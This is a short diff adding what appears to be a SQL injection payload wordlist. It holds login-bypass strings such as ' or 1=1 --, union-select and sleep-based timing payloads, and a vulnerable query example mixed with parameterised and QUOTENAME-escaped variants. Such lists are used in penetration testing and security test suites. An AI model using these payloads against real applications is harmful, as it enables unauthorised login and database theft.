@@ -1,0 +1,5 @@
+' or 1=1 -- ^' OR 1=1 -- ^ ' OR 1=1 # ^SELECT * FROM Users WHERE username = "invalid_user" OR "1"="1" AND password = "invalid_pass" OR "1"="1"^SELECT count(*)FROM users WHERE username = ? AND password = ?^update Users set password='   
+    + QUOTENAME(@new, '''') + ' where username='   
+    + QUOTENAME(@loginname, '''') + ' AND password = '   
+    + QUOTENAME(@old, '''')^' or 1=1    --+^' or 1=1     #^" or "        " "^" or true    --^" or true    --+^')) or true    -- -^admin'  or 1=1 or ''='^admin') or ('1'='1'--^admin') or '1'='1'/*^admin") or "1"="1^') or ('1'='1    --^' order by 1,sleep(10)    --+^' union select @@version,sleep(10),3        --+^' union select @@version,sleep(10),3,"'3'"#    --+^
+
